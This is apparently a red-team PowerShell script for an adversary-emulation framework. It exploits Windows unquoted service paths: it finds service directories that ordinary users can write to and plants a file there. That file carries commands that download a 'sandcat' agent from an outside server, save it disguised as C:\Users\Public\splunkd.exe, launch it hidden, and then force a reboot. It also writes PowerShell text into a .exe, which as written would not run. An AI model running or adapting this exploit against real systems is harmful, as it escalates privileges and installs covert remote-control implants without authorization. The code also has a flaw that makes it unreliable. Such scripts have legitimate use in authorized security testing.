# Retrieve and save service paths
$ErrorActionPreference = "SilentlyContinue"
$svclist = Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object {Get-ItemProperty $_.PsPath}

$servicePaths = @()
ForEach ($svc in $svclist) {
    $svcpath = $svc.ImagePath -split ".exe"
    if(($svcpath[0] -like "* *") -and ($svcpath[0] -notlike '"*') -and ($svcpath[0] -notlike "\*")) {
        $svcpath = $svcpath[0] + ".exe"
        $servicePaths += $svcpath
    }
}

# Traverse and identify writable directory
foreach ($path in $servicePaths) {
    $commands = @"
$server="http://172.16.172.16:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData($url)
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f
rm -force "C:\Users\Public\splunkd.exe" -ea ignore
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden
Get-Process
"@

    $parentDir = Split-Path -Path $path -Parent
    $dirName = ($path -split "\\")[-2]

    if ($dirName -match "\s") {
        $parentParentDir = Split-Path -Path $parentDir -Parent
        $acl = Get-Acl $parentParentDir -ErrorAction SilentlyContinue
        $accessRules = $acl.Access

        foreach ($rule in $accessRules) {
            if (($rule.IdentityReference -eq "BUILTIN\Users") -and ($rule.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                Write-Host "Found writable directory: $parentParentDir"
                Set-Location $parentParentDir
                $words = $dirName -split "\s+"
                $fileName = $words[0] + ".exe"
                $commands | Out-File -FilePath $fileName -Encoding ASCII -NoClobber
                # If the service is not running, restart the system
                $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                if ($svcStatus -ne "Running") {
                    Restart-Computer -Force -ErrorAction SilentlyContinue
                }
                break
            }
        }
    }
}
